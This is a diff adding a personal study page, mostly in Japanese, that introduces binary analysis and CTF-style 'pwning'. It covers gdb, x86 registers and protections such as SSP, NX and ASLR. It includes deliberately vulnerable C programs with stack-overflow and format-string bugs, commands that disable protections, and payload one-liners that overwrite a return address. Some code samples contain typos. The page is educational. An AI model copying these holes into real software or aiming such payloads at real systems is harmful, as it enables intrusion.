@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>analyzing binaries and intro to pwning | yuasabe</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="analyzing binaries and intro to pwning" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="yuasabe.github.io" />
+<meta property="og:description" content="yuasabe.github.io" />
+<link rel="canonical" href="http://localhost:4000/pwn01.html" />
+<meta property="og:url" content="http://localhost:4000/pwn01.html" />
+<meta property="og:site_name" content="yuasabe" />
+<script type="application/ld+json">
+{"description":"yuasabe.github.io","@type":"WebPage","url":"http://localhost:4000/pwn01.html","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://avatars3.githubusercontent.com/u/5180742?s=400&u=2d2abb484ef4fca12fe432ac562b6ff69aa70278&v=4"}},"headline":"analyzing binaries and intro to pwning","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/">yuasabe</a></h1>
+        
+        
+          <img src="https://avatars3.githubusercontent.com/u/5180742?s=400&u=2d2abb484ef4fca12fe432ac562b6ff69aa70278&v=4" alt="Logo" />
+        
+
+        <p>yuasabe.github.io</p>
+
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <h1 id="analyzing-binaries-and-intro-to-pwning">analyzing binaries and intro to pwning</h1>
+
+<h2 id="環境構築">環境構築</h2>
+<ul>
+  <li>ELFのための32bit/64bitのLinuxを用意するところから始める</li>
+  <li>EXEのためのWindows環境も用意する</li>
+  <li>Linux: file, readelf, strings, unzip/tar/xz + strace, ltrace, radare2, ghexをインストール</li>
+  <li>gdb, objdumpもインストール</li>
+  <li>dex2jarもダウンロード、実行可能に</li>
+  <li>jdguiも同様</li>
+  <li>Windowsであれば、OllyDbg, うさみみハリケーン、 IDA Free, ILSpy, Bz等があればよい</li>
+</ul>
+
+<h2 id="３つの解析手法">３つの解析手法</h2>
+<ul>
+  <li>表層解析
+    <ul>
+      <li>フォーマットを確認</li>
+      <li>印字可能文字列を確認</li>
+    </ul>
+  </li>
+  <li>実行環境を用意して動的解析</li>
+  <li>逆アセンブルして静的解析</li>
+</ul>
+
+<h2 id="intro-to-gdb-debugger">Intro to gdb debugger</h2>
+<ul>
+  <li>disas (function name)</li>
+  <li>x/ (命令数) i (先頭アドレス)</li>
+  <li>set disassembly-flavor (intel/att)</li>
+  <li>b (関数名)</li>
+  <li>b (アドレス)</li>
+  <li>show breakpoint info: i b</li>
+  <li>delete breakpoint: d (breakpoint num)</li>
+  <li>disable (breakpoint num) / enable</li>
+  <li>ignore</li>
+  <li>run: r</li>
+  <li>stop at main: start</li>
+  <li>set args (cli arg1) (cli arg2)</li>
+  <li>set (レジスタ名)=(値)</li>
+  <li>step over: ni</li>
+  <li>step in: si</li>
+  <li>continue: c</li>
+  <li>read register: p (レジスタ名)</li>
+  <li>info registers: i r</li>
+  <li>x/(表示する数)(メモリサイズbhwg)(表示フォーマットsix) (表示するメモリの先頭アドレス)</li>
+  <li>backtrace: bt</li>
+  <li>watch/rw/aw (メモリアドレス)</li>
+</ul>
+
+<h2 id="アセンブリ言語">アセンブリ言語</h2>
+<ul>
+  <li>レジスタとスタック x86アーキテクチャ</li>
+  <li>レジスタ：プロセッサ内に存在する記憶装置であり、メモリや補助記憶装置と比較して高速に動作する。32bit CPU, 64bit CPU</li>
+  <li>x86アーキテクチャのレジスタ（32 bit registers）</li>
+  <li>EAX, ECX, EDX, EBX, ESI, EDIの６つの汎用レジスタ</li>
+  <li>EBP, ESP, EIPの特殊レジスタ</li>
+  <li>EFLAGSのフラグレジスタ</li>
+  <li>セグメントレジスタ</li>
+</ul>
+
+<h3 id="example-assembly-code-and-its-corresponding-stacks">Example assembly code and its corresponding stacks</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Func1:
+    push arg2
+    push arg1
+    call Func2
+    mov retval, eax
+
+Func2:
+    push ebp
+    mov ebp, esp
+    sub esp, 100h
+    mov eax, [ebp+8]
+    mov ebx, [ebp+Ch]
+    …
+    mov esp, ebp
+    pop ebp
+    ret
+</code></pre></div></div>
+
+<h3 id="disassemble-from-binary-using-objdump">disassemble from binary using objdump</h3>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -d -m intel crack_me
+</code></pre></div></div>
+
+<p>rasm2 -d 9090 -&gt; nop nop</p>
+
+<p>C言語でプログラムを書き、コンパイルしてバイナリにしたものを解析してみる</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -Wall hello.c -o hello
+$ objdump -d hello -x86-asm-syntax=intel
+</code></pre></div></div>
+
+<h2 id="upcoming-ctfs">Upcoming CTFs</h2>
+<h3 id="google-ctf-2018">Google CTF 2018</h3>
+<p>https://capturetheflag.withgoogle.com/
+How can I prepare for this competition?<br />
+  A good introduction to CTFs is available here:<br />
+    https://trailofbits.github.io/ctf/index.html<br />
+  If you want to practice similar challenges to the ones you will be asked for
+  you can play security wargames such as:<br />
+    * Microcorruption: https://microcorruption.com/<br />
+    * Cryptopals: https://cryptopals.com/<br />
+    * XSS Game: https://www.xssgame.com<br />
+  If you want even more, there is also a long list of sites that offer
+  security-related wargames here:<br />
+    https://www.wechall.net/active_sites<br />
+  And you can find the write-ups of Google’s last year CTF here:<br />
+    https://drive.google.com/corp/drive/folders/0BwMPuUHZOj0nZ2dGZS1KbWNGN0E<br />
+  and here:<br />
+    https://ctftime.org/event/455/tasks/</p>
+
+<p>https://github.com/google/google-ctf</p>
+
+<h1 id="into-to-pwning">into to pwning</h1>
+<h2 id="basic-tools-and-what-they-do">basic tools and what they do</h2>
+<h3 id="checksecsh">checksec.sh</h3>
+<p>https://github.com/slimm609/checksec.sh<br />
+実行ファイルが備えているセキュリティ機構を読みやすい形式で表示してくれるシェルスクリプト。<br />
+RELRO, SSP, NX bitの確認を行う。</p>
+
+<p>RELRO: RElocation ReadOnly<br />
+メモリ上に配置されるデータのどの部分に対してReadOnly属性を付けるかを決定。</p>
+<ul>
+  <li>No RELRO</li>
+  <li>Partial RELRO (Lazy)</li>
+  <li>Full RELRO
+の３種類が存在し、GOT Overwrite exploitを行えるかを判断<br />
+GOT Overwrite攻撃が成功するのは、No RELROとPartial RELROの場合のみ。詳しくは後述する。</li>
+</ul>
+
+<p>Stack Smash Protection (SSP)<br />
+スタックフレームのローカル変数領域とSaved EBPの間にCanaryと呼ばれる値を挿入し、関数の終了時にその値が書き換えられているかどうかを判定するこでBuffer Overflowの検出を行う。Canary値には乱数が用いられるが、LSBがnullバイトになるようになってる。<br />
+多くのコンパイラではこのSSPが有効になってるが、gccではコンパイルするときに<code class="highlighter-rouge">-fno-stack-protector</code>オプションを指定することで無効化できる。</p>
+
+<p>NX bit: No execute bit<br />
+メモリ上の実効する必要のないデータを実効不可能に設定することで、攻撃者がシェルコードを使って攻撃するのを困難にする。任意コードの実効が不可能になるため、実効可能コードの断片をうまく組み合わせて攻撃することになる。gccでは<code class="highlighter-rouge">-z execstack</code>オプションをコンパイル時に付与することでNX bitを無効化できる。</p>
+
+<p>ASLR: Address Space Layout Randomization<br />
+スタックやヒープ、共有ライブラリ等をメモリに配置するときに、アドレスの一部をランダム化することで攻撃者がアドレスを推測するのを困難にする。CTFではほとんどの問題でASLR有効になってる。<br />
+Ubuntu 14.04 LTSでは次のコマンドでON/OFFを切り替え。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ON: $ sudo sysctl -w kernel.randomize_va_space=2
+OFF: $ sudo sysctl -w kernel.randomize_va_space=0
+</code></pre></div></div>
+
+<h3 id="peda-installed-in-kali">peda (installed in kali)</h3>
+<ul>
+  <li>pdisassemble pdisass</li>
+  <li>ropgadget</li>
+  <li>pattern</li>
+  <li>vmmap</li>
+</ul>
+
+<h1 id="finding-vulnerabilities">Finding Vulnerabilities</h1>
+<p>プログラムが落ちるような入力を探すことで、書き込み不可能なアドレスに書き込もうとしていたり、実効不可能なアドレスを実効しようとしたりしている箇所を特定でき、それをうまく制御することで、プログラムの実効位置（IP=instruction pointer）を自由に変更できる状態に持っていける。eip(rip)を奪えれば脆弱性を探すステップはほぼ終わり。一旦はシェルを奪取できるかどうか。</p>
+
+<h2 id="ユーザー入力を扱う関数">ユーザー入力を扱う関数</h2>
+<p>scanf, fgetsなどは入力をメモリ上に配置するため入力がバッファサイズを超えてしまうとbofの脆弱性に繋がることがある。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// bof.c
+</span><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>buffer変数のサイズは100バイト分だが、標準入力から読み込まれる文字列は最大128バイトになってる。SSP無効の状態で実効すると、Bofを発生できる。Segmentation faultとでるはず。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -m32 -fno-stack-protector -o bof bof.c
+$ python -c 'print(CTF for Beginners)' | ./bof
+$ python -c 'print("A"*128)' | ./bof
+Segmentation fault
+</code></pre></div></div>
+<p><code class="highlighter-rouge">python -c 'print("A"*128)' | strace -i ./bof</code>とトレースすることにより、eipが奪えてることを確認できる。</p>
+
+<h2 id="printf系関数の書式文字列攻撃">printf系関数の書式文字列攻撃</h2>
+<p>printfなどで書式文字列を扱う関数では、書式文字列部分にユーザーの入力を用いてしまうと入力に書式指定子が存在した場合、その部分がフォーマットされてすったくのデータが出力されてしまう。直接はeip奪取にはつながらないが深刻な脆弱性。</p>
+
+<pre><code class="language-format.c">#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[]) {
+	char str[128];
+	fgets(str, 128, stdin);
+	printf("Hello, ")
+	print(str);
+	return 0;
+}
+</code></pre>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -m32 -o format format.c
+$ ./format
+%x,%x,%x,%x,%x
+Hello, 80, f7......important data.....
+</code></pre></div></div>
+
+<h1 id="exploiting">Exploiting</h1>
+<p>Disable ASLR before doing the following.</p>
+
+<h2 id="stack-overflow">Stack Overflow</h2>
+<h3 id="ローカル変数を破壊する">ローカル変数を破壊する</h3>
+<pre><code class="language-bof1.c">#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[]) {
+	int zero = 0;
+	char buffer[10];
+
+	printf("buffer address\t= %x\n", (int)buffer);
+	printf("zero address\t= %x\n", (int)&amp;zero);
+
+	fgets(buffer, 64, stdin);
+	printf("zero = %d\n", zero);
+	return 0;
+}
+</code></pre>
+<p>このコードを32bit向け、SSP無効でコンパイル。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -m32 -fno-stack-protector -o bof1 bof1.c
+</code></pre></div></div>
+<p>入力にAAAAAAAAAAAAAAAAを入れると変数zeroが任意の整数になる。</p>
+
+<h3 id="ローカル変数を任意の値に書き換える">ローカル変数を任意の値に書き換える</h3>
+<p><code class="highlighter-rouge">'AAAA' = 0x41414141 = 1094795585</code>
+入力をうまく調整すればzero変数に自由な値を設定できる。</p>
+
+<pre><code class="language-bof2.c">#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[]) {
+	char buffer[10];
+	int zero = 0;
+
+	fgets(buffer, 64, stdin);
+	printf("zero = %x\n", zero);
+	if (zero == 0x12345678) {
+		printf("congrats!");
+	}
+	return 0;
+}
+</code></pre>
+<p>コンパイル、実行</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -m32 -fno-stack-protector -o bof2 bof2.c
+$ echo -e 'AAAAAAAAAA\x12\x34\x56\x78' | ./bof2
+$ echo -e 'AAAAAAAAAA\x78\x56\x34\x12' | ./bof2
+</code></pre></div></div>
+<p>little endianであることに注意
+追記）後日これで試してみたらsegfaultは起こせても、変数の任意の書き換えは行えなかった。標準入力からfgetsしたときには、終端文字として0x0aが追加され、int zeroの4バイト分を全て上書きしようとすると、そのすぐ次の1バイトが0x0aで書き換わってしまう。以下のようにmain関数以外の関数で書くと正常の動く… なぜなんだ…</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"buffer address = %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"zero address = %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">zero</span><span class="p">);</span>
+
+	<span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"zero = %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">zero</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">zero</span> <span class="o">==</span> <span class="mh">0x12345678</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"congrats!!"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">foo</span><span class="p">();</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>g optionをつけると、gdbでシンボルつきになる。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gcc -m32 -fno-stack-protector -g -o bof2 bof2.c
+</code></pre></div></div>
+
+<h3 id="リターンアドレスの書き換え">リターンアドレスの書き換え</h3>
+
+<p>リターンアドレスを書き換えることでプログラムの実効一を変更することができる。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">local</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"buffer: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">local</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>これではEIPをうまく奪取できなかった。
+関数を分けて、実行するとうまくいく。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">local</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"buffer: 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
+	<span class="n">fgets</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">local</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+	<span class="n">foo</span><span class="p">();</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>main関数の先頭アドレスを取得できれば、</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "print 'A'*44 + '\x9e\x55\x55\x56'" | ./bof2
+</code></pre></div></div>
+<p>などでEIPを奪取し、main関数を2回実行できる。</p>
+
+
+      </section>
+      <footer>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+    
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-120752245-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+    
+  </body>
+</html>
